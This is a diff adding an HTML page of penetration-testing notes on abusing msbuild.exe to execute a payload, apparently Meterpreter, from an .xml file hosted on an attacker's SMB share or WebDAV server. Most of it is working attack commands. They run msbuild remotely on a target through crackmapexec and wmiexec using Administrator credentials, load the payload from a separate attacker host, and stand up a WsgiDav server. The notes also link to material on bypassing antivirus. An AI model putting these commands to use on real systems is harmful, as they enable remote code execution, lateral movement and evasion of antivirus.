@@ -1,0 +1,38 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Msbuild</title>
+</head><body>https://www.n00py.io/2018/06/executing-meterpreter-in-memory-on-windows-10-and-bypassing-antivirus/<br/>
+https://www.n00py.io/2018/06/executing-meterpreter-in-memory-on-windows-10-and-bypassing-antivirus-part-2/<br/>
+<br/>
+In certain versions of .Net, you can use msbuild.exe to execute a payload from an .xml file. Msbuild can be called any number of ways. There are two main ways to source the payload: smb and webdav (or www server). <br/>
+<br/>
+Files pulled from webdav are stored in Windows\ServiceProfiles\LocalService\AppData\Local\Temp directories, so be mindful<br/>
+Msbuild is not disk-less, stores files in %USER%\AppData\Local\Temp, but it does clean up after itself<br/>
+<br/>
+Using SMB:<br/>
+<br/>
+Directly:<br/>
+%windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\192.168.137.133\Guest Share\msbuild_nps.xml<br/>
+<br/>
+CME:<br/>
+crackmapexec smb 192.168.137.1 -u Administrator -p Password123 -x '%windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\192.168.137.133\Guest\msbuild_nps.xml'<br/>
+<br/>
+PSExec:<br/>
+python wmiexec.py Adminstrator:Password123@192.168.137.1 cmd.exe /c start %windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\192.168.137.133\Guest\msbuild_nps.xml<br/>
+<br/>
+WMI:<br/>
+python wmiexec.py Adminstrator:Password123@192.168.137.1 cmd.exe /c start %windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\192.168.137.133\Guest\msbuild_nps.xml<br/>
+<br/>
+<br/>
+Using WebDav<br/>
+pip install WsgiDav cheroot<br/>
+wsgidav --host=0.0.0.0 --port=80 --root=/tmp<br/>
+<br/>
+CME: <br/>
+crackmapexec smb 192.168.137.1 -u Administrator -p Password123 -x '%windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\192.168.137.134\Davwwwroot\test\msbuild_nps.xml'<br/>
+<br/>
+WMI:<br/>
+python wmiexec.py Administrator:Password123@192.168.137.1<br/>
+C:\&gt;%windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\192.168.137.134\Davwwwroot\test\msbuild_nps.xml</body></html>
